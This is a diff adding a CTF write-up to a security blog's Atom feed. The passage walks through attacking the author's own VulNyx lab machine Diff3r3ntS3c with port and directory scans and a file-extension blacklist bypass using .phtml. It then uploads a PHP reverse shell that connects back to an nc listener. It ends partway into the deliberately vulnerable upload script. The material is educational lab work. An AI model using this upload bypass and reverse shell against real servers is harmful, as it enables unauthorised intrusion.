@@ -1,4 +1,579 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2024-04-01T22:59:11+02:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">VulNyx: HackingStation</title><link href="https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation/" rel="alternate" type="text/html" title="VulNyx: HackingStation" /><published>2024-03-31T00:00:00+01:00</published><updated>2024-03-31T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/03/31/vulnyx-hackingstation/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2024-04-08T01:17:15+02:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">VulNyx: Diff3r3ntS3c</title><link href="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/" rel="alternate" type="text/html" title="VulNyx: Diff3r3ntS3c" /><published>2024-04-08T00:00:00+02:00</published><updated>2024-04-08T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Port and service scanning&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Gaining access&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-2-1&quot;&gt;2.1. Detecting the arbitrary file upload&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-2-2&quot;&gt;2.2. Getting a shell as candidate&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-2-3&quot;&gt;2.3. Why does this arbitrary file upload exist?&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Privilege escalation&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Detecting the cronjob vulnerability&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Getting a shell as root&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Why does this privilege escalation via cronjob exist?&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png&quot; style=&quot;width: 750px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this post we are going to see the writeup of the machine Diff3r3ntS3c from &lt;a href=&quot;https://vulnyx.com/&quot;&gt;VulNyx&lt;/a&gt;. It’s an easy machine created by &lt;a href=&quot;https://hackcommander.github.io/&quot;&gt;HackCommander&lt;/a&gt; (yeah, it’s me again :blush:) especially designed for beginners. We are going to get access to the machine through an arbitrary file upload in a web form and then to escalate privileges through a cronjob executed as root using a script editable by any user.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-1&quot; /&gt;
+
+&lt;h2 id=&quot;1-port-and-service-scanning&quot;&gt;1. Port and service scanning&lt;/h2&gt;
+
+&lt;p&gt;After running a port scan&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 10000 10.0.2.20
+&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:33 CEST
+Nmap scan report for 10.0.2.20
+Host is up (0.00010s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;we can see that the port 80 is open and therefore there is a web. Now running a service scan&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.0.2.20
+&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:34 CEST
+Nmap scan report for 10.0.2.20
+Host is up (0.00038s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Diff3r3ntS3c
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;we can see that there is a webserver &lt;em&gt;Apache httpd 2.4.57&lt;/em&gt; running on Debian, but before looking for CVEs it is better to take a look at the web.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2&quot; /&gt;
+
+&lt;h2 id=&quot;2-gaining-access&quot;&gt;2. Gaining access&lt;/h2&gt;
+
+&lt;div id=&quot;section-id-2-1&quot; /&gt;
+
+&lt;h2 id=&quot;21-detecting-the-arbitrary-file-upload&quot;&gt;2.1. Detecting the arbitrary file upload&lt;/h2&gt;
+
+&lt;p&gt;Accessing the website, it looks like the website of a cybersecurity company&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/web-index.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and if we scroll down we can see that there is an upload form for candidates who want to work in the company&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we try to upload a photo&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form-picture.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we get the following message&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/png-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems that it is not performing any file renaming or any modification on the uploaded file, which is a good sign for us as hackers. Now we should find the directory where the file was uploaded, for which we could use the ffuf tool as follows&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/OneListForAll/onelistforallmicro.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.0.2.20/FUZZ 
+&lt;span class=&quot;go&quot;&gt;
+        /&apos;___\  /&apos;___\           /&apos;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.20/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallmicro.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.ht_wsr.txt             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd-old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.httpd.conf             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccessbak            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+index.phps              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+?wsdl                   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 1ms]
+.htpasswds              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess-dev           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+server-status?full      [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htm.bak                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+?view=log               [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htgroup                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.swp           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.txt           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htm.old                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+yesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylngrequesturlbutwearedoingitonpurposewearescann [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+index.html              [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+.htpasswd_test          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htf                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.httr-oauth             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 235ms]
+.htaccess_extra         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess_sc            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.save          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 247ms]
+.htaccess.sample        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess_orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
+.htusers                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.bak1          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+server-status?full&amp;amp;showmodulestate [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess-marco         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccessold2           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+                        [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+.htpasswrd              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.html.bak               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccessold            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+wp-config.phps          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess-local         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.html.old               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess~              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+index.html?findcli=-1   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 0ms]
+:: Progress: [26468/26468] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:05] :: Errors: 1 ::
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, there is an &lt;em&gt;uploads&lt;/em&gt; directory. If we visit it we can see that this directory is vulnerable to &lt;em&gt;directory listing&lt;/em&gt; as we can see listed all the directories and files in the path&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-uploads.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we access directory &lt;em&gt;1&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we can see that there are 2 files, a &lt;em&gt;txt&lt;/em&gt; file with the user’s data&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-txt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and the png file that has been uploaded without any renaming or change in the content&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-png.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This may mean that the developer was not too careful in coding the file upload, since it is convenient to rename the uploaded files to avoid duplicate filenames and for security. However, sending the file upload request with burpsuite but changing the file extension to &lt;em&gt;php&lt;/em&gt; we receive the following message&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/php-not-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So the backend is checking if the file extension is malicious or not. &lt;strong&gt;The question is whether it is using a whitelist or a blacklist of extensions&lt;/strong&gt; to perform this check, and depending on that there could be an &lt;a href=&quot;https://portswigger.net/web-security/file-upload&quot;&gt;arbitrary file upload&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;If we go to &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/file-upload&quot;&gt;HackTricks&lt;/a&gt; we can see that there are some simple file upload methods that we can check manually before running more complex attacks&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/hacktricks.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We could copy all the extensions and send the burpsuite request to the intruder to check if there are any valid extensions. However, if it is using a blacklist of extensions it is quite likely that any of those extensions are valid, so using a random extension such as &lt;em&gt;phtml&lt;/em&gt;, it throws the following message&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/phtml-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that &lt;strong&gt;we bypassed the file extension check by uploading a file with an extension that also allows the execution of PHP code&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2-2&quot; /&gt;
+
+&lt;h2 id=&quot;22-getting-a-shell-as-candidate&quot;&gt;2.2. Getting a shell as candidate&lt;/h2&gt;
+
+&lt;p&gt;To verify if the backend performs any checks on the file content and if we can execute code, let’s try to upload the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentestmonkey webshell&lt;/a&gt; with &lt;em&gt;phtml&lt;/em&gt; extension.&lt;/p&gt;
+
+&lt;p&gt;After downloading the webshell, changing the extension to &lt;em&gt;phtml&lt;/em&gt; and changing the IP to that of my attacking machine as follows&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-conf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;it only remains to upload the webshell to the server. It is not necessary to use the burp for this task, and we can do it manually, receiving the following message&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-ok-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we go to the last directory in the uploads directory and see that the shell was uploaded successfully&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After this, setting up a listener on the attacking machine on port 1234&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nc -nlvp 1234
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and by clicking on the webshell, we receive the shell, and we can execute the following code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(hackcommander㉿kali)-[~]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
+&lt;span class=&quot;go&quot;&gt;listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 49956
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Linux Diff3r3ntS3c 6.1.0-18-amd64 #&lt;/span&gt;1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2024-02-01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x86_64 GNU/Linux
+&lt;span class=&quot;go&quot;&gt; 16:45:30 up  2:22,  0 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/bin/sh: 0: can&apos;t access tty;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;job control turned off
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;candidate
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/candidate
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;user.txt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;where we can see that we got a shell as the &lt;em&gt;candidate&lt;/em&gt; user and that the user flag is in &lt;em&gt;/home/candidate/user.txt&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2-3&quot; /&gt;
+
+&lt;h2 id=&quot;23-why-does-this-arbitrary-file-upload-exist&quot;&gt;2.3. Why does this arbitrary file upload exist?&lt;/h2&gt;
+
+&lt;p&gt;After opening the script that performs the data upload, we can see the following PHP code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Get the name and the phone number of the user&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$phone_number&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;phone_number&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Get the file name and file temporal name&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$file_tmp_name&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;tmp_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Create the data upload directory&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$upload_directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;./uploads/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$new_directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;glob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload_directory&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/*&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;GLOB_ONLYDIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload_directory&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$new_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
